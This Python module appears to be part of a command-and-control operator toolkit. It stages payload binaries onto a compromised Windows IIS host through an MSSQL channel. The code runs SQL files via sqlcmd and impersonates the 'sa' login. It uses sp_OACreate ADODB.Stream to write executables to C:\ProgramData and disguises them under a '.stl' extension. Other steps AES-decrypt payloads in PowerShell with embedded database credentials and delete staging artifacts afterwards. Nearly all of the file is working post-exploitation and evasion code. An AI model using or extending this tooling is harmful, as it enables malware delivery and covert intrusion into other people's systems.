import os

# controlShell/xp_mssql/ -> ../../payloads/ (same machine as controlServer,
# so the source payload size is readable locally for the post-stage verify)
_PAYLOADS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                             "..", "..", "payloads")


class StagingMixin:
    """Stage binaries to IIS01 via MSSQL DB channel."""

    def cmd_xpstage(self, shell, payload_name: str, encrypt: bool = True):
        """Stage a binary to IIS01 via MSSQL DB channel (no HTTP from IIS01)."""
        resp     = shell._post_json("/api/v1.0/mssql/stage", {
            "handler": "toneshell",
            "payload": payload_name,
            "encrypt": encrypt,
        })
        sql_file = resp["sqlFile"]
        key_b64  = resp.get("key", "")

        remote_sql = f"C:\\Windows\\Temp\\{sql_file}"
        shell.cmd_put_wait(sql_file, remote_sql)

        shell.cmd_exec_raw(f'{self._sqlcmd_prefix()} -i {remote_sql}')

        out_path = f"C:\\ProgramData\\{payload_name}"
        ps = self._build_decrypt_ps(key_b64, out_path) if (encrypt and key_b64) \
             else self._build_plain_ps(out_path)
        self.cmd_xpshell_psh(shell, ps)

        shell.cmd_exec_raw(f'cmd /c del /f {remote_sql}')
        self._exec_q(shell, "EXECUTE AS LOGIN='sa';IF OBJECT_ID('tempdb..stg','U') IS NOT NULL DROP TABLE tempdb..stg;")
        print(f"[+] xpstage done: {out_path}")

    def cmd_xpstage_hex(self, shell, payload_name: str, timeout_s: int = None,
                        stl: bool = False, rename: bool = False):
        """Stage binary to IIS01 via hex SQL + T-SQL ADODB.Stream decode (no .ps1).

        Default (direct): the decode batch SaveToFile's straight to
        C:\\ProgramData\\<payload_name> (original extension, e.g. .exe) - no
        transient file, no MoveFile. xprun dispatch requires this for unsigned
        payloads (ShellExecuteEx resolves execution by extension/association).

        With --stl: the binary is written as <stem>.stl and left under the
        masquerading extension - used for signed payloads (e.g. CertEnrollSvc)
        that ShellExecuteEx runs fine from a benign extension.

        With --stl --rename: a sp_OA FSO MoveFile in the same decode batch
        renames the .stl back to the original payload_name - transient
        masquerade for payloads executed by CreateProcess-based dispatch.

        rename requires stl. timeout_s (optional): implant wait-limit override
        for the decode batch (None = operator `timeout <n>` value; the poll
        itself blocks until the task terminates). Decode of a multi-MB payload
        can take minutes.
        """
        if rename and not stl:
            print("[!] xpstage-hex: --rename requires --stl")
            return
        resp = shell._post_json("/api/v1.0/mssql/stage", {
            "handler": "toneshell",
            "payload": payload_name,
            "format": "hex",
        })
        sql_file = resp["sqlFile"]

        remote_sql = f"C:\\Windows\\Temp\\{os.path.splitext(sql_file)[0]}.stl"
        shell.cmd_put_wait(sql_file, remote_sql)
        shell.cmd_exec_raw(f'{self._sqlcmd_prefix()} -i {remote_sql}')

        out_path = f"C:\\ProgramData\\{payload_name}"
        stl_path = f"C:\\ProgramData\\{os.path.splitext(payload_name)[0]}.stl"
        write_path = stl_path if stl else out_path
        decode_tsql = (
            "EXECUTE AS LOGIN='sa';"
            "DECLARE @hex VARCHAR(MAX)='';"
            "SELECT @hex=@hex+CAST(chunk AS VARCHAR(MAX))"
            " FROM tempdb..stg ORDER BY id;"
            "DECLARE @bin VARBINARY(MAX)="
            "CONVERT(VARBINARY(MAX),'0x'+@hex,1);"
            "DECLARE @obj INT,@hr INT;"
            "EXEC @hr=sp_OACreate 'ADODB.Stream',@obj OUT;"
            "EXEC sp_OASetProperty @obj,'Type',1;"
            "EXEC sp_OAMethod @obj,'Open';"
            "EXEC sp_OAMethod @obj,'Write',NULL,@bin;"
            f"EXEC sp_OAMethod @obj,'SaveToFile',NULL,"
            f"'{self._tsql_escape(write_path)}',2;"
            "EXEC sp_OAMethod @obj,'Close';"
            "EXEC sp_OADestroy @obj;"
        )
        if rename:
            decode_tsql += (
                "EXEC @hr=sp_OACreate 'Scripting.FileSystemObject',@obj OUT;"
                f"EXEC sp_OAMethod @obj,'MoveFile',NULL,"
                f"'{self._tsql_escape(stl_path)}','{self._tsql_escape(out_path)}';"
                "EXEC sp_OADestroy @obj;"
            )
        self._exec_q(shell, decode_tsql, timeout_s=timeout_s)

        final_path = stl_path if (stl and not rename) else out_path

        # Size verify: the ADODB.Stream write has no integrity feedback - a
        # failed/interleaved SaveToFile silently leaves the previous on-disk
        # file in place. Compare the staged file against the source payload.
        expected = None
        try:
            expected = os.path.getsize(os.path.join(_PAYLOADS_DIR, payload_name))
        except OSError as e:
            print(f"[!] xpstage-hex: cannot stat local payload for size verify: {e}")
        if expected is not None:
            self._verify_staged_size(shell, final_path, expected)

        shell.cmd_exec_raw(f'cmd /c del /f {remote_sql}')
        self._exec_q(shell, "EXECUTE AS LOGIN='sa';"
            "IF OBJECT_ID('tempdb..stg','U') IS NOT NULL DROP TABLE tempdb..stg;")
        print(f"[+] xpstage-hex done: {final_path}")

    def _verify_staged_size(self, shell, disk_path: str, expected_bytes: int):
        """Compare the staged binary's on-disk size with the source payload."""
        out = self._exec_q(shell,
            "EXECUTE AS LOGIN='sa';"
            "SELECT DATALENGTH(BulkColumn) FROM OPENROWSET(BULK "
            f"'{self._tsql_escape(disk_path)}',SINGLE_BLOB) AS x;"
        )
        on_disk = None
        for line in (out or "").splitlines():
            s = line.strip()
            if s.isdigit():
                on_disk = int(s)
                break
        if on_disk == expected_bytes:
            print(f"[+] size match: {disk_path} ({expected_bytes} bytes)")
        else:
            print(f"[!] SIZE MISMATCH: {disk_path} on-disk={on_disk} "
                  f"expected={expected_bytes} — re-stage (xpstage-hex)")

    def _build_decrypt_ps(self, key_b64: str, out_path: str) -> str:
        sqlclient_host = self._host.replace(':', ',')
        connstr = f'Server={sqlclient_host};Database=tempdb;User ID={self._login};Password={self._password};TrustServerCertificate=True'
        return (
            f"$kb=[System.Text.Encoding]::ASCII.GetBytes('{key_b64}');"
            "$kt=New-Object System.Security.Cryptography.FromBase64Transform;"
            "$kms=New-Object System.IO.MemoryStream;"
            "$kcs=New-Object System.Security.Cryptography.CryptoStream($kms,$kt,[System.Security.Cryptography.CryptoStreamMode]::Write);"
            "$kcs.Write($kb,0,$kb.Length);$kcs.FlushFinalBlock();$k=$kms.ToArray();"
            f"$cn=New-Object System.Data.SqlClient.SqlConnection('{connstr}');"
            "$cn.Open();$cm=$cn.CreateCommand();"
            "$cm.CommandText='SELECT chunk FROM tempdb..stg ORDER BY id';"
            "$rd=$cm.ExecuteReader();$sb=New-Object System.Text.StringBuilder;"
            "while($rd.Read()){$sb.Append($rd.GetString(0))|Out-Null};"
            "$rd.Close();$cn.Close();"
            "$raw=[System.Text.Encoding]::ASCII.GetBytes($sb.ToString());"
            "$t=New-Object System.Security.Cryptography.FromBase64Transform;"
            "$ms=New-Object System.IO.MemoryStream;"
            "$cs=New-Object System.Security.Cryptography.CryptoStream($ms,$t,[System.Security.Cryptography.CryptoStreamMode]::Write);"
            "$cs.Write($raw,0,$raw.Length);$cs.FlushFinalBlock();"
            "$b=$ms.ToArray();"
            "$a=[System.Security.Cryptography.Aes]::Create();"
            "$a.Mode='CBC';$a.Padding='PKCS7';$a.Key=$k;$a.IV=$b[0..15];"
            "$ct=$b[16..($b.Length-1)];"
            "$dec=$a.CreateDecryptor().TransformFinalBlock($ct,0,$ct.Length);"
            f"[IO.File]::WriteAllBytes('{out_path}',$dec)"
        )

    def _build_plain_ps(self, out_path: str) -> str:
        sqlclient_host = self._host.replace(':', ',')
        connstr = f'Server={sqlclient_host};Database=tempdb;User ID={self._login};Password={self._password};TrustServerCertificate=True'
        return (
            f"$cn=New-Object System.Data.SqlClient.SqlConnection('{connstr}');"
            "$cn.Open();$cm=$cn.CreateCommand();"
            "$cm.CommandText='SELECT chunk FROM tempdb..stg ORDER BY id';"
            "$rd=$cm.ExecuteReader();$sb=New-Object System.Text.StringBuilder;"
            "while($rd.Read()){$sb.Append($rd.GetString(0))|Out-Null};"
            "$rd.Close();$cn.Close();"
            "$raw=[System.Text.Encoding]::ASCII.GetBytes($sb.ToString());"
            "$t=New-Object System.Security.Cryptography.FromBase64Transform;"
            "$ms=New-Object System.IO.MemoryStream;"
            "$cs=New-Object System.Security.Cryptography.CryptoStream($ms,$t,[System.Security.Cryptography.CryptoStreamMode]::Write);"
            "$cs.Write($raw,0,$raw.Length);$cs.FlushFinalBlock();"
            "$b=$ms.ToArray();"
            f"[IO.File]::WriteAllBytes('{out_path}',$b)"
        )
